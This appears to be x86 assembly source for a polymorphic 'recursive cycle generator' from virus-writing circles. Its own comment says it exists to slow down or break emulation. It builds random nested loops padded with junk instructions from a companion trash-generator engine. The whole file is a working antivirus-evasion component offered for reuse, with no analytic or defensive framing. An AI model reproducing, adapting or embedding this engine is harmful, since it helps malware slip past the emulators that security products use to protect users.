
; PRCG -- Polymorphic Recursive Cycle Generator
; (used to slow down or even fuckup emulation process)

; input:  EDI=buffer
; output: EAX=size of generated data
; uses:   ETG

prcg_engine:            pusha
                        rnd     2
                        add     eax, 3  ; max recursion level: 3-4
                        push    not REG_ESP
                        push    eax
                        push    edi
                        call    gencycle_1
;                       mov     buf[eax], 0C3h
;                       inc     eax
                        mov     [esp+7*4], eax
                        popa
                        ret

gencycle_1              proc    pascal
                        arg     bufptr
                        arg     level
                        arg     regavail
                        pusha
                        cld
                        mov     edi, bufptr

                        cmp     regavail, 0
                        je      __quit
__getreg:               rnd     8
                        xchg    ebx, eax
                        bt      regavail, ebx
                        jnc     __getreg

                        call    __etg

                        call    __etg

                        mov     al, 0B8h        ; mov reg, c1
                        or      al, bl
                        stosb
                        call    my_rnd
                        mov     eax, randseed
                        stosd
                        xchg    esi, eax

                        call    __etg

                        mov     edx, edi

                        call    __etg

                        call    __newcycle

                        call    __etg

                        mov     al, 40h         ; inc reg
                        add     al, bl
                        stosb

                        call    __etg

                        call    __newcycle

                        call    __etg

                        mov     ax, 0F881h      ; cmp reg, c2
                        or      ah, bl
                        stosw
                        rnd     10
                        lea     eax, [eax+esi+10]
                        stosd

                        mov     ax, 850Fh       ; jne
                        stosw
                        lea     eax, [edx-4]
                        sub     eax, edi
                        stosd

                        call    __etg

__quit:                 sub     edi, bufptr
                        mov     [esp+7*4], edi    ; <-- popa.eax
                        popa
                        ret


__newcycle:             pusha
                        rnd     2
                        jz      __skip
                        mov     eax, level
                        or      eax, eax
                        jz      __skip
                        dec     eax
                        mov     ecx, regavail
                        btr     ecx, ebx
                        push    ecx
                        push    eax
                        push    edi
                        call    gencycle_1
                        add     [esp], eax
__skip:                 popa
                        retn

__etg:                  pusha
                        push    eax
                        mov     eax, esp
                        pusho   my_rnd
                        push    edi
                        push    1024
                        push    1
                        push    eax
                        mov     eax, regavail
                        btr     eax, ebx
                        push    eax
                        push    REG_ALL
                        push    ETG_ALL-ETG_JMPS
                        call    etg_engine
                        pop     eax
                        add     [esp], eax
                        popa
                        retn

                        endp
